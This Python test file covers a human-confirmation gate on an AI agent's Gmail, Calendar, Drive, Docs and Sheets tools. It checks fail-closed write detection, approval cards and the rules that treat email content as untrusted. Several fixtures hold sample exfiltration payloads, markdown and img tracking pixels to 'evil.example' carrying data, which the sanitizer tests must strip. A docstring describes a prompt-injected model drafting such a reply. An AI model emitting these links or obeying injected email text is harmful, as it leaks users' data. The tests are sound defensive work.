"""Write-confirmation gate for Composio tools
(Gmail / Calendar / Drive / Docs / Sheets).

Mirrors the Buildium write-confirmation suite's boundary-assert style: a STUB
``agents.FunctionTool`` stands in for the opaque Composio tool, and we assert
at the inner-invoke boundary whether the original tool ran.

CI-safe: imports only ``agents.FunctionTool`` (in base [dev] deps) +
``helixis.connectors.tool_gate``. No Composio, no [connectors] extra, no creds.

Classifier under test (FAIL-CLOSED): default = WRITE (gated); a slug is READ
only if it matches a read pattern AND carries no write verb. Unknown/novel and
read-shaped-but-write-verbed slugs are gated.
"""

from __future__ import annotations

import json
from typing import Any

import pytest
from agents import Agent, FunctionTool

from helixis.agents import tools as agent_tools
from helixis.connectors import tool_gate


def _stub_tool(slug: str) -> tuple[FunctionTool, dict[str, int]]:
    """A provider-shaped FunctionTool whose invoke increments a counter so we
    can assert at the boundary whether it actually ran."""
    calls = {"n": 0}

    async def inner(_ctx: Any, payload: str) -> str:
        calls["n"] += 1
        return json.dumps({"successful": True, "data": "executed", "payload": payload})

    tool = FunctionTool(
        name=slug,
        description=f"stub for {slug}",
        params_json_schema={
            "type": "object",
            "properties": {"to": {"type": "string"}},
            "additionalProperties": False,
        },
        on_invoke_tool=inner,
        strict_json_schema=False,
    )
    return tool, calls


async def _drain() -> None:
    await agent_tools.drain_pending_confirmations()


async def _resolve_next(approved: bool) -> None:
    """Yield until the gate emits its confirm payload, then resolve it."""
    import asyncio

    for _ in range(50):
        await asyncio.sleep(0)
        drained = await agent_tools.drain_pending_confirmations()
        if drained:
            await agent_tools.resolve_confirmation(drained[0]["confirm_id"], approved)
            return
    raise AssertionError("gate did not emit a confirm payload")


# ── classifier unit checks ──────────────────────────────────────────────────


@pytest.mark.parametrize(
    "slug",
    [
        "GMAIL_LIST_MESSAGES",
        "GMAIL_FETCH_MESSAGE",
        "GMAIL_SEARCH_PEOPLE",
        "GMAIL_GET_PROFILE",
        "GOOGLECALENDAR_EVENTS_LIST",
        "GOOGLECALENDAR_FIND_EVENT",
        "GOOGLECALENDAR_LIST_CALENDARS",
        "GOOGLECALENDAR_GET_CURRENT_DATE_TIME",
        "GOOGLEDRIVE_LIST_FILES",
        "GOOGLEDRIVE_DOWNLOAD_FILE",
        "GOOGLEDRIVE_GET_FILE",
    ],
)
def test_reads_classified_as_read(slug: str) -> None:
    assert tool_gate.is_write_tool(slug) is False


@pytest.mark.parametrize(
    "slug",
    [
        "GMAIL_SEND_EMAIL",
        "GMAIL_REPLY_TO_THREAD",
        "GMAIL_ADD_LABEL_TO_EMAIL",
        "GMAIL_MOVE_TO_TRASH",
        "GOOGLECALENDAR_CREATE_EVENT",
        "GOOGLECALENDAR_UPDATE_EVENT",
        "GOOGLECALENDAR_DELETE_EVENT",
        "GOOGLEDRIVE_UPLOAD_FILE",
        "GOOGLEDRIVE_DELETE_FOLDER",
        "GOOGLEDRIVE_ADD_FILE_SHARING_PREFERENCE",
        # unknown / novel slug → fail closed
        "GMAIL_SOME_BRAND_NEW_ACTION",
        "GOOGLECALENDAR_QUICK_ADD",
        "",
    ],
)
def test_writes_and_unknowns_classified_as_write(slug: str) -> None:
    assert tool_gate.is_write_tool(slug) is True


@pytest.mark.parametrize(
    "slug",
    [
        # read-shaped (match _GET_) but carry a write verb → must be GATED
        "GOOGLEDRIVE_GET_OR_CREATE_FOLDER",
        "GMAIL_GET_OR_CREATE_LABEL",
        # composite "read-then-mutate" slugs caught by the extended verb set:
        # each matches a read segment yet carries a mutation verb → GATED.
        "GMAIL_GET_AND_MARK_AS_READ",
        "GMAIL_FETCH_AND_FORWARD_MESSAGE",
        "GOOGLECALENDAR_FIND_AND_CANCEL_EVENT",
        "GOOGLEDRIVE_GET_AND_RENAME_FILE",
        "GOOGLEDRIVE_GET_AND_COPY_FILE",
        "GOOGLEDRIVE_LIST_AND_EMPTY_TRASH",
        "GMAIL_SEARCH_AND_ARCHIVE",
        "GOOGLECALENDAR_GET_AND_SET_VISIBILITY",
    ],
)
def test_read_shaped_with_write_verb_is_gated(slug: str) -> None:
    """Collision case: the write-verb check moves read→gated, never the
    reverse. These match a read pattern but contain a mutation verb → write."""
    assert tool_gate.is_write_tool(slug) is True


def test_every_write_verb_dominates_a_read_segment() -> None:
    """Invariant: for EVERY write-verb token, a slug that also matches a read
    segment is still gated. Locks the fail-closed posture across the whole
    token set so a future edit can't introduce a read-shaped leak."""
    for token in tool_gate._WRITE_VERB_TOKENS:
        slug = f"GMAIL_GET_{token}_THING"  # contains ``_GET_`` (a read segment)
        assert tool_gate.is_write_tool(slug) is True, f"{token} leaked as a read"


def test_extended_verbs_do_not_over_gate_known_reads() -> None:
    """Guard against the over-gating failure mode: the documented read slugs
    must stay reads after the verb-set expansion (no new token is a substring
    of a real read)."""
    known_reads = [
        "GMAIL_LIST_MESSAGES",
        "GMAIL_LIST_DRAFTS",
        "GMAIL_LIST_LABELS",
        "GMAIL_FETCH_MESSAGE",
        "GMAIL_GET_PROFILE",
        "GOOGLECALENDAR_EVENTS_LIST",
        "GOOGLECALENDAR_LIST_CALENDARS",
        "GOOGLECALENDAR_GET_CURRENT_DATE_TIME",
        "GOOGLEDRIVE_LIST_FILES",
        "GOOGLEDRIVE_DOWNLOAD_FILE",
        "GOOGLEDRIVE_GET_FILE",
    ]
    for slug in known_reads:
        assert tool_gate.is_write_tool(slug) is False, f"{slug} was over-gated"


# ── boundary behavior ─────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_write_approve_calls_inner_once() -> None:
    await _drain()
    tool, calls = _stub_tool("GMAIL_SEND_EMAIL")
    gated = tool_gate.gate_tool(tool)
    assert gated is not tool  # a new wrapped tool

    import asyncio

    task = asyncio.create_task(gated.on_invoke_tool(None, json.dumps({"to": "a@b.com"})))
    await _resolve_next(True)
    result = await asyncio.wait_for(task, timeout=1.0)

    assert calls["n"] == 1
    assert '"executed"' in result


@pytest.mark.asyncio
async def test_write_deny_does_not_call_inner() -> None:
    await _drain()
    tool, calls = _stub_tool("GOOGLECALENDAR_DELETE_EVENT")
    gated = tool_gate.gate_tool(tool)

    import asyncio

    task = asyncio.create_task(gated.on_invoke_tool(None, "{}"))
    await _resolve_next(False)
    result = await asyncio.wait_for(task, timeout=1.0)

    assert calls["n"] == 0
    assert "nothing was changed" in result.lower()


@pytest.mark.asyncio
async def test_read_passes_through_ungated() -> None:
    await _drain()
    tool, calls = _stub_tool("GMAIL_LIST_MESSAGES")
    gated = tool_gate.gate_tool(tool)
    # Read → same object, no wrapping.
    assert gated is tool
    # Runs without any confirm round-trip.
    result = await gated.on_invoke_tool(None, "{}")
    assert calls["n"] == 1
    assert '"executed"' in result
    # No confirm payload was emitted.
    assert await agent_tools.drain_pending_confirmations() == []


@pytest.mark.asyncio
async def test_unknown_slug_is_gated() -> None:
    """Fail-closed: a novel slug we've never seen must be treated as a write."""
    await _drain()
    tool, calls = _stub_tool("GMAIL_SOME_BRAND_NEW_ACTION")
    gated = tool_gate.gate_tool(tool)
    assert gated is not tool

    import asyncio

    task = asyncio.create_task(gated.on_invoke_tool(None, "{}"))
    await _resolve_next(False)
    await asyncio.wait_for(task, timeout=1.0)
    assert calls["n"] == 0


@pytest.mark.asyncio
async def test_unparseable_payload_still_gated() -> None:
    """A malformed args payload must not bypass the gate — args become {}
    and the tool stays gated."""
    await _drain()
    tool, calls = _stub_tool("GMAIL_SEND_EMAIL")
    gated = tool_gate.gate_tool(tool)

    import asyncio

    task = asyncio.create_task(gated.on_invoke_tool(None, "this is not json{{"))
    await _resolve_next(False)
    result = await asyncio.wait_for(task, timeout=1.0)
    assert calls["n"] == 0
    assert "nothing was changed" in result.lower()


def test_wrapped_tool_preserves_shape_and_agent_accepts_it() -> None:
    tool, _ = _stub_tool("GOOGLECALENDAR_CREATE_EVENT")
    gated = tool_gate.gate_tool(tool)
    assert gated.name == tool.name
    assert gated.description == tool.description
    assert gated.params_json_schema == tool.params_json_schema
    assert gated.strict_json_schema == tool.strict_json_schema
    # An Agent accepts the wrapped tool in its tools list.
    agent = Agent(name="t", instructions="x", tools=[gated])
    assert gated in agent.tools


def test_gate_tools_splits_reads_and_writes() -> None:
    read, _ = _stub_tool("GMAIL_LIST_MESSAGES")
    write, _ = _stub_tool("GMAIL_SEND_EMAIL")
    out = tool_gate.gate_tools([read, write])
    # Read passed through (identity); write replaced with a wrapper.
    assert out[0] is read
    assert out[1] is not write
    assert out[1].name == "GMAIL_SEND_EMAIL"


# ── confirm-card body preview (Q68: body-blind approval) ─────────────────────


def test_render_confirm_gmail_send_shows_body() -> None:
    text = tool_gate.render_confirm_text(
        "GMAIL_SEND_EMAIL",
        {"recipient_email": "sarah@x.com", "subject": "Re: leak", "body": "I'll send a plumber."},
    )
    assert "sarah@x.com" in text and "Re: leak" in text
    # The consequential payload — the body — is now visible to the approver.
    assert "Message:" in text and "I'll send a plumber." in text


def test_render_confirm_gmail_send_truncates_long_body() -> None:
    long = "x" * 900
    text = tool_gate.render_confirm_text(
        "GMAIL_REPLY_TO_THREAD", {"to": "a@b.com", "message": long}
    )
    assert "+500 chars" in text  # 900 - 400 preview
    assert "Message:" in text


# ── outgoing exfil-strip (Q67: last deterministic gate before send) ──────────


def test_sanitize_outgoing_strips_gmail_body() -> None:
    dirty = (
        "Thanks!\n![px](https://evil.example/x.png?leak=1)\n<img src='https://evil.example/y'>Bye"
    )
    out = tool_gate._sanitize_outgoing("GMAIL_SEND_EMAIL", {"to": "a@b.com", "body": dirty})
    assert "evil.example" not in out["body"]
    assert "Thanks!" in out["body"] and "Bye" in out["body"]


def test_sanitize_outgoing_noop_for_non_gmail_send() -> None:
    args = {"summary": "Tour", "description": "[link](https://x.com)"}
    # Calendar create is a write, but not a Gmail send — body-strip must not touch it.
    assert tool_gate._sanitize_outgoing("GOOGLECALENDAR_CREATE_EVENT", args) == args
    # A Gmail READ is likewise untouched.
    assert tool_gate._sanitize_outgoing("GMAIL_FETCH_EMAILS", args) == args


@pytest.mark.asyncio
async def test_gmail_send_strips_exfiltration_before_execution() -> None:
    """End-to-end through the gate: an approved send executes the SANITIZED
    body, not the injected one — the deterministic backstop if the model was
    steered into drafting a tracking-pixel reply."""
    await _drain()
    tool, calls = _stub_tool("GMAIL_SEND_EMAIL")
    gated = tool_gate.gate_tool(tool)

    import asyncio

    dirty = "Hi Sarah — done.\n![t](https://evil.example/p.png?data=ledger)\nBest"
    task = asyncio.create_task(
        gated.on_invoke_tool(None, json.dumps({"recipient_email": "s@x.com", "body": dirty}))
    )
    await _resolve_next(True)
    result = await asyncio.wait_for(task, timeout=1.0)

    assert calls["n"] == 1
    # inner echoes the payload it actually received; the body must be stripped.
    executed = json.loads(json.loads(result)["payload"])
    assert "evil.example" not in executed["body"]
    assert "Hi Sarah" in executed["body"] and "Best" in executed["body"]


def test_gmail_agent_instructions_carry_untrusted_rule() -> None:
    import re

    from helixis.agents.gmail_agent import GMAIL_AGENT_INSTRUCTIONS

    # Normalize whitespace so wrapped phrases ("do\nNOT obey") still match.
    flat = re.sub(r"\s+", " ", GMAIL_AGENT_INSTRUCTIONS.lower())
    assert "untrusted" in flat
    assert "never as instructions" in flat
    assert "do not obey" in flat


# ── Google Docs + Sheets (added 2026-08-24) ─────────────────────────────────
#
# Two new toolkits reach the SAME gate. ``is_write_tool`` is slug-pattern based
# and fail-closed, so they are covered by construction rather than by an
# allowlist — these tests pin that claim instead of assuming it, because the
# whole point of the fail-closed design is that nobody has to remember a new
# toolkit exists.
#
# ⚠ These slugs are NOT from a live ``tools.get`` dump (no Composio key in the
# build sandbox) — same limitation the TODO(composio-live-dump) in tool_gate.py
# records, now widened to cover these two. They are representative shapes, so a
# green run here means "the classifier handles slugs of this shape", never
# "every real Docs/Sheets slug is classified correctly".


@pytest.mark.parametrize(
    "slug",
    [
        "GOOGLEDOCS_CREATE_DOCUMENT",
        "GOOGLEDOCS_UPDATE_EXISTING_DOCUMENT",
        "GOOGLEDOCS_DELETE_DOCUMENT",
        "GOOGLESHEETS_BATCH_UPDATE",
        "GOOGLESHEETS_CLEAR_VALUES",
        "GOOGLESHEETS_SPREADSHEETS_VALUES_APPEND",
        "GOOGLESHEETS_CREATE_SPREADSHEET",
    ],
)
def test_docs_and_sheets_mutations_are_gated(slug: str) -> None:
    """Every mutation verb must reach the confirm gate. A Sheets write is the
    dangerous one — it overwrites cells in place with no undo."""
    assert tool_gate.is_write_tool(slug) is True


@pytest.mark.parametrize(
    "slug",
    [
        "GOOGLEDOCS_GET_DOCUMENT",
        "GOOGLEDOCS_SEARCH_DOCUMENTS",
        "GOOGLESHEETS_LIST_SPREADSHEETS",
        "GOOGLESHEETS_GET_SPREADSHEET_INFO",
    ],
)
def test_docs_and_sheets_reads_are_not_gated(slug: str) -> None:
    """Over-gating a read is safe but makes the product unusable — every
    lookup would raise an approval card."""
    assert tool_gate.is_write_tool(slug) is False


def test_a_trailing_get_is_a_read_wherever_it_sits_in_the_slug() -> None:
    """The gap the previous version of this test PINNED, now closed.

    It said: ``_READ_VERB_SEGMENTS`` spelled GET as ``"_GET_"`` with a trailing
    underscore while its five siblings had none, so ``GOOGLESHEETS_BATCH_GET``
    fell through to fail-closed and every "read my rent roll" would demand
    approval. It declined to fix it because moving a slug gated→read on
    inference is the one direction this classifier must never take, and only a
    live per-toolkit dump could prove it safe.

    The dump exists now (``tests/fixtures/composio_tool_slugs.json``, 603
    slugs, #914) and the classifier matches whole ``_``-delimited segments, so
    position no longer decides. The proof is not here — it is
    ``test_no_destructive_slug_is_ungated`` in
    ``test_tool_gate_against_live_slugs.py``, run over every real slug. This
    test keeps the specific shapes that motivated the pin.
    """
    assert tool_gate.is_write_tool("GOOGLESHEETS_BATCH_GET") is False
    assert tool_gate.is_write_tool("GMAIL_MESSAGES_GET") is False
    assert tool_gate.is_write_tool("GOOGLESHEETS_GET_VALUES") is False


def test_a_write_verb_inside_a_longer_word_is_not_a_write_verb() -> None:
    """⚠ The substring bug that cost 300 seconds a call.

    ``SET`` lived inside ``SETTINGS``, ``SHARE`` inside ``SHARED``, ``ADD``
    inside ``ADDRESSES``, ``FORWARD`` inside ``FORWARDING`` — so these plain
    lookups raised an approval card, and the stall watchdog paused for the
    whole unanswered wait.

    Both directions, because an exclusion tested in one direction is how the
    original bug hid: the word as a SEGMENT must still gate.
    """
    assert tool_gate.is_write_tool("GMAIL_GET_VACATION_SETTINGS") is False
    assert tool_gate.is_write_tool("GOOGLEDRIVE_LIST_SHARED_DRIVES") is False
    assert tool_gate.is_write_tool("GMAIL_LIST_FORWARDING_ADDRESSES") is False
    assert tool_gate.is_write_tool("OUTLOOK_GET_MAILBOX_SETTINGS") is False

    assert tool_gate.is_write_tool("GMAIL_SET_VACATION") is True
    assert tool_gate.is_write_tool("GOOGLEDRIVE_SHARE_FILE") is True
    assert tool_gate.is_write_tool("GMAIL_ADD_LABEL_TO_EMAIL") is True
    assert tool_gate.is_write_tool("GMAIL_FORWARD_MESSAGE") is True


def test_reading_a_google_doc_is_not_an_approval_gated_action() -> None:
    """⚠ The most expensive misclassification this product has shipped.

    ``EXPORT`` and ``PARSE`` are how Drive/Docs hand back a file's CONTENT.
    Neither carried a read verb, so both fell to fail-closed — and 20 of the 44
    confirmations ever raised on the live table were these two slugs, every one
    expiring unanswered at ~300s. Occupella could not read its own SOP corpus
    because opening a document required a human to approve opening it.

    A gate here is not a stricter posture. It is the feature not working.
    """
    assert tool_gate.is_write_tool("GOOGLEDRIVE_EXPORT_GOOGLE_WORKSPACE_FILE") is False
    assert tool_gate.is_write_tool("GOOGLEDRIVE_PARSE_FILE") is False
    assert tool_gate.is_write_tool("GOOGLEDOCS_EXPORT_DOCUMENT_AS_PDF") is False
    # ...and exporting is still not a licence to mutate.
    assert tool_gate.is_write_tool("GOOGLEDRIVE_EXPORT_AND_DELETE_FILE") is True


def test_an_unknown_docs_or_sheets_slug_fails_closed() -> None:
    """The property that makes adding a toolkit safe WITHOUT a live dump: a
    slug nobody anticipated is a write until proven otherwise."""
    assert tool_gate.is_write_tool("GOOGLESHEETS_SOMETHING_NOBODY_ANTICIPATED") is True
    assert tool_gate.is_write_tool("GOOGLEDOCS_XYZZY") is True


def test_sheets_confirm_card_sizes_the_payload_and_never_dumps_it() -> None:
    """A body-blind approval card is the #537-audit Q68 failure. Sheets is the
    worst case for it: ``values`` is a whole rent roll, and dumping it produces
    a card nobody reads — which is functionally the same as showing nothing.

    The card must name WHERE the write lands and HOW MUCH it touches, and must
    not contain the cell contents.
    """
    text = tool_gate.render_confirm_text(
        "GOOGLESHEETS_BATCH_UPDATE",
        {
            "title": "2026 Rent Roll",
            "range": "Sheet1!A2:C4",
            "values": [
                ["4B", "Maria Alvarez", "1450"],
                ["5A", "Jon Reyes", "1620"],
                ["6C", "Dana Okafor", "1585"],
            ],
        },
    )
    assert "2026 Rent Roll" in text
    assert "Sheet1!A2:C4" in text
    assert "3 row(s) × 3 column(s)" in text
    # The cells themselves must NOT be in the card.
    for leaked in ("Maria Alvarez", "Jon Reyes", "Dana Okafor", "1450", "1620"):
        assert leaked not in text, f"confirm card leaked cell content: {leaked!r}"


def test_sheets_confirm_card_survives_a_missing_or_odd_values_shape() -> None:
    """Rendering is best-effort and must never raise — the GATE does not
    depend on the card rendering, so a weird payload must degrade, not throw."""
    assert "Sheets write" in tool_gate.render_confirm_text("GOOGLESHEETS_BATCH_UPDATE", {})
    ragged = tool_gate.render_confirm_text(
        "GOOGLESHEETS_BATCH_UPDATE",
        {"spreadsheet_id": "abc123", "values": [["a"], ["b", "c"], "not-a-row"]},
    )
    assert "3 row(s) × 2 column(s)" in ragged


def test_docs_confirm_card_names_the_document() -> None:
    text = tool_gate.render_confirm_text(
        "GOOGLEDOCS_UPDATE_EXISTING_DOCUMENT",
        {"title": "Lease Addendum — 4B", "document_id": "doc_987"},
    )
    assert "Docs write" in text
    assert "Lease Addendum — 4B" in text
